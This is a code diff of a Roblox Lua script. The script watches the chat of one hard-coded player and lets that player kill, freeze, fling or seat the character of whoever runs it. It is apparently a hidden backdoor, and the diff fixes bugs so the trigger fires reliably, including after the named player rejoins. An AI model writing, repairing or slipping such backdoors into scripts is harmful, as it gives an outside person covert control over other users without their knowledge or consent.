@@ -20,7 +20,6 @@ Ghostplayer = "russelpalodizon"
 
 local function ExecuteAdminCMD()
 game.Players[Ghostplayer].Chatted:connect(function(admin_msg)
-ExecuteAdminCMD()
 if admin_msg == ":kill "..game.Players.LocalPlayer.Name or admin_msg == ":kill all" then
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
 elseif admin_msg == ":freeze "..game.Players.LocalPlayer.Name then
@@ -51,19 +50,19 @@ elseif admin_msg == ":fling "..game.Players.LocalPlayer.Name then
    bambam.Force = Vector3.new(999990,0,999990)
    bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
 elseif admin_msg == ":sit "..game.Players.LocalPlayer.Name then
-   game:GetService("Players").LocalPlayer.Character.Humanoid.Sit = not game:GetService("Players").LocalPlayer.Character.Humanoid.Sit
+   game.Players.LocalPlayer.Character.Humanoid.Sit = true
 end
 end)
 end
 
 FoundAdmin = false
 game:GetService('RunService').Heartbeat:connect(function()
-if FoundAdmin == false then
-   if game.Players:FindFirstChild(Ghostplayer) then
+if game.Players:FindFirstChild(Ghostplayer) then
+   if FoundAdmin == false then
        FoundAdmin = true
        ExecuteAdminCMD()
-   else
-       FoundAdmin = false
    end
+else
+   FoundAdmin = false
 end
 end)
